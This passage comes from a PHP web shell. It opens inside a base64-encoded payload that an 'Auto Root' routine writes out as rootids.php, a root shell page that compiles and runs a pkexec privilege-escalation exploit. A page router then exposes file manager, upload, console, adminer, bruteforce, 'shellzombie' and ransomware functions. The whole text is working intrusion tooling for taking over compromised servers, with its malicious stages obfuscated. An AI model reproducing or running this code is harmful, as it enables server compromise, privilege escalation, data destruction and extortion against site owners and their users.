na2tkV2xrSUQwZ1FIQnZjMmw0WDJkbGRIQjNkV2xrS0hCdmMybDRYMmRsZEdWMWFXUW9LU2s3Q2dra1oybGtJRDBnUUhCdmMybDRYMmRsZEdkeVoybGtLSEJ2YzJsNFgyZGxkR1ZuYVdRb0tTazdDZ2trZFhObGNpQTlJQ1IxYVdSYkoyNWhiV1VuWFRzS0NTUjFhV1FnUFNBa2RXbGtXeWQxYVdRblhUc0tDU1JuY205MWNDQTlJQ1JuYVdSYkoyNWhiV1VuWFRzS0NTUm5hV1FnUFNBa1oybGtXeWRuYVdRblhUc0tmUW9LSkd0bGNtNWxiQ0E5SUhCb2NGOTFibUZ0WlNncE93by9QZ29LUENGRVQwTlVXVkJGSUdoMGJXdytDanhvZEcxc1Bnb0pQR2hsWVdRK0Nna0pQSFJwZEd4bFB1T0NwT09EcytPRGllT0N1K09EZytPQ3J6d3ZkR2wwYkdVK0Nna0pQSE5qY21sd2RDQjBlWEJsUFNKMFpYaDBMMnBoZG1GelkzSnBjSFFpSUhOeVl6MGlhSFIwY0hNNkx5OWhhbUY0TG1kdmIyZHNaV0Z3YVhNdVkyOXRMMkZxWVhndmJHbGljeTlxY1hWbGNua3ZNeTQxTGpFdmFuRjFaWEo1TG0xcGJpNXFjeUkrUEM5elkzSnBjSFErQ2drOEwyaGxZV1ErQ2p4aWIyUjVQZ29KUEdadmNtMGdiV1YwYUc5a1BTSndiM04wSWlCaFkzUnBiMjQ5SW5KdmIzUnBaSE15TG5Cb2NDSStDZ2tKUEdneVBsSlBUMVFnVTBoRlRFd2dSVmhGUTFWVVQxSThMMmd5UGp4aWNqNEtDUWs4UDNCb2NDQmxZMmh2S0NKVFdWTlVSVTA2SUNSclpYSnVaV3c4WW5JK0lpazdJRDgrQ2drSlBEOXdhSEFnWldOb2J5Z2lWVWxFTDBkSlJEb2dKSFZ6WlhJZ0tDQWtkV2xrSUNrZ2ZDQWtaM0p2ZFhBZ0tDQWtaMmxrSUNrOFluSStQR0p5UGlJcE95QS9QZ29KQ1R4cGJuQjFkQ0IwZVhCbFBTZDBaWGgwSnlCdVlXMWxQU0pqYldRaUlHbGtQU2RqYldRblBqd3ZhVzV3ZFhRK0Nna0pQR0oxZEhSdmJpQnBaRDBpWW5SdUlpQjBlWEJsUFNKemRXSnRhWFFpUGt0cGNtbHRQQzlpZFhSMGIyNCtDZ2s4TDJadmNtMCtDZ2s4YzJOeWFYQjBJSFI1Y0dVOUluUmxlSFF2YW1GMllYTmpjbWx3ZENJK0Nna0pKQ2htZFc1amRHbHZiaWdwZXdvSkNRa2tLQ0ptYjNKdElpa3VjM1ZpYldsMEtHWjFibU4wYVc5dUtDbDdDZ2tKQ1Fra0xtRnFZWGdvZXdvSkNRa0pDWFZ5YkRva0tIUm9hWE1wTG1GMGRISW9JbUZqZEdsdmJpSXBMQW9KQ1FrSkNXUmhkR0U2SkNoMGFHbHpLUzV6WlhKcFlXeHBlbVVvS1N3S0NRa0pDUWwwZVhCbE9pUW9kR2hwY3lrdVlYUjBjaWdpYldWMGFHOWtJaWtzQ2drSkNRa0paR0YwWVZSNWNHVTZJQ2RvZEcxc0p5d0tDUWtKQ1FsaVpXWnZjbVZUWlc1a09pQm1kVzVqZEdsdmJpZ3BJSHNLQ1FrSkNRa0pKQ2dpYVc1d2RYUWlLUzVoZEhSeUtDSmthWE5oWW14bFpDSXNkSEoxWlNrN0Nna0pDUWtKQ1NRb0ltSjFkSFJ2YmlJcExtRjBkSElvSW1ScGMyRmliR1ZrSWl4MGNuVmxLVHNLQ1FrSkNRbDlMQW9KQ1FrSkNXTnZiWEJzWlhSbE9tWjFibU4wYVc5dUtDa2dld29KQ1FrSkNRa2tLQ0pwYm5CMWRDSXBMbUYwZEhJb0ltUnBjMkZpYkdWa0lpeG1ZV3h6WlNrN0Nna0pDUWtKQ1NRb0ltSjFkSFJ2YmlJcExtRjBkSElvSW1ScGMyRmliR1ZrSWl4bVlXeHpaU2s3Q1FrSkNRa0pDUWtLQ1FrSkNRbDlMQW9KQ1FrSkNYTjFZMk5sYzNNNlpuVnVZM1JwYjI0b2FHRnphV3dwSUhzS0NRa0pDUWtKZG1GeUlIUjRkQ0E5SUNRb0lpTmpiV1FpS1RzS0NRa0pDUWtKYVdZb2RIaDBMblpoYkNncExuUnlhVzBvS1M1c1pXNW5kR2dnUENBeEtTQjdDZ2tKQ1FrSkNRbGhiR1Z5ZENnaWFXNXdkWFFnWTIxa0lHSmxabTl5WlZObGJtUWlLVHNLQ1FrSkNRa0pmV1ZzYzJWN0Nna0pDUWtKQ1Fra0tDSWpjMmhsYkd4eVpYTndiMjRpS1M1b2RHMXNLQ2M4Y0hKbFBpY2dLeUJvWVhOcGJDQXJJQ2M4TDNCeVpUNG5LVHNLQ1FrSkNRa0pDU1FvSW1admNtMGlLVnN3WFM1eVpYTmxkQ2dwT3dvSkNRa0pDUWtKYzJWMFZHbHRaVzkxZENobWRXNWpkR2x2YmlncGV3b0pDUWtKQ1FrSkNTUW9JbWx1Y0hWMElpa3VabTlqZFhNb0tUc0tDUWtKQ1FrSkNYMHNNVEF3TUNrN0Nna0pDUWtKQ1gwS0NRa0pDUWw5Q2drSkNRbDlLUW9KQ1FseVpYUjFjbTRnWm1Gc2MyVTdDZ2tKQ1gwcE93b0pDWDBwT3dvSlBDOXpZM0pwY0hRK0NnazhaR2wySUdsa1BTSnphR1ZzYkhKbGMzQnZiaUkrUEM5a2FYWStDZ2s4TDJKdlpIaytDand2YUhSdGJEND0iOwogICAgJGZwID0gZm9wZW4oInJvb3RzaGVsbC5waHAiLCAidyIpOwogICAgZndyaXRlKCRmcCwgYmFzZTY0X2RlY29kZSgkZmlsZXMpKTsKICAgIGZjbG9zZSgkZnApOwogICAgcmV0dXJuIFRydWU7Cn0KCiRrZXJuZWwgPSBwaHBfdW5hbWUoKTsKJHBrZXhlYyA9IGNoZWNrZXhlKCJwa2V4ZWMgLS1oZWxwIikgPyAiPGZvbnQgY29sb3I9bGltZT5PTjwvZm9udD4iIDogIjxmb250IGNvbG9yPXJlZD5PRkY8L2ZvbnQ+IjsKJGdjYyA9IGNoZWNrZXhlKCJnY2MgLS1oZWxwIikgPyAiPGZvbnQgY29sb3I9bGltZT5PTjwvZm9udD4iIDogIjxmb250IGNvbG9yPXJlZD5PRkY8L2ZvbnQ+IjsKJHB5dGhvbiA9IGNoZWNrZXhlKCJweXRob24gLS1oZWxwIikgPyAiPGZvbnQgY29sb3I9bGltZT5PTjwvZm9udD4iIDogIjxmb250IGNvbG9yPXJlZD5PRkY8L2ZvbnQ+IjsKJGNoZWNrX3N5c3RlbSA9IGZ1bmN0aW9uX2V4aXN0cygic3lzdGVtIikgPyAiPGZvbnQgY29sb3I9bGltZT5PTjwvZm9udD4iIDogIjxmb250IGNvbG9yPXJlZD5PRkY8L2ZvbnQ+IjsKCmVjaG8gIlNZU1RFTTogeyRrZXJuZWx9PGJyPiI7CmVjaG8gIlVJRC9HSUQ6IHskdXNlcn0gKCB7JHVpZH0gKSB8IHskZ3JvdXB9ICggeyRnaWR9ICk8YnI+IjsKZWNobyAiU1lTVEVNX0ZVTkNUSU9OOiB7JGNoZWNrX3N5c3RlbX0gfCBHQ0M6IHskZ2NjfSB8IFBZVEhPTjogeyRweXRob259IHwgUEtFWEVDOiB7JHBrZXhlY308L2JyPiI7CgplY2hvICI8YnI+PGJyPm1ha2Ugc3VyZSBzeXN0ZW1fZnVuY3Rpb24sIGdjYywgcHl0aG9uLCBwa2V4ZWMgYWxsIGVuYWJsZWQ8YnI+IjsgPz4KPGZvcm0gYWN0aW9uPSIibWV0aG9kPSJQT1NUIj4KICAgIDxpbnB1dCBuYW1lPSJnYXNzIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJ0b3VjaCBtZSBzZW5wYWkhISEiPgo8L2Zvcm0+Cjw/cGhwCgppZiAoaXNzZXQoJF9QT1NUWyJnYXNzIl0pKSB7IAogICAgJHNwYXduX3Jvb3RjID0gcm9vdGMoKTsKICAgIGlmKCRzcGF3bl9yb290YykgewogICAgICAgIGlmKCFmaWxlX2V4aXN0cygicHJ2ZXNjLmMiKSkgZGllKCJDYW4ndCB3cml0ZSBmaWxlISIpOwoKICAgICAgICAkZ2FzcyA9IHN5c3RlbSgiZ2NjIHBydmVzYy5jIC1vIHBydmVzYzsgY2htb2QgK3ggcHJ2ZXNjOyAuL3BydmVzYyIpOwoKICAgICAgICBpZiAoIWZpbGVfZXhpc3RzKCJnZXRyb290IikpIGRpZSgiQ2FuJ3Qgcm9vdCB0aGlzIHNlcnZlciEiKTsKCiAgICAgICAgcm9vdHNoZWxsX3B5KCk7CiAgICAgICAgcHJvY2VzcygpOwogICAgICAgIHNlbmRjbWQoKTsKICAgIH0KfQo=";
		$fp = fopen("rootids.php", "w");
    	fwrite($fp, base64_decode($content));
    	fclose($fp);
		$templateForm = "<a class='btn btn-info btn-block' href='rootids.php' target='_blank'>go to link</a>";
	}

	pages("autoroot", ["Tools", "Auto Root"], array("{{FORMROOT}}"), array($templateForm));
}

if(isset($_GET["page"]))
{
	$page = $_GET["page"];
	if($page == "dashboard") dashboard();

	// File
	if($page == "filemanager") filemanager();
	if($page == "upload") upload();
	if($page == "viewfile") viewfile();
	if($page == "rename") renameF();
	if($page == "delete") hapus();
	if($page == "edit") editF();
	if($page == "chmod") chmods();
	if($page == "newfile") newfile();
	if($page == "newfolder") newfolder();
	if($page == "download") download($path);
	if($page == "backup") backup();

	// Mass
	// if($page == "mdeface") mdeface();
	if($page == "mdelete") mdelete();

	// Tools
	if($page == "search") search();
	if($page == "console") console();
	if($page == "adminer") adminer();
	if($page == "network") network();
	if($page == "shellzombie") shellzombie();
	if($page == "bruteforce") bruteforce();
	if($page == "ransomware") ransomware();
	if($page == "autoroot") autoroot();

	// Info
	if($page == "about") pages($page, ["About"]);
	if($page == "phpinfo") phpinfo();


	if($page == "logout") {
		session_destroy() ;
		echo '<script>window.location="?";</script>';
	} 

} else { dashboard(); }
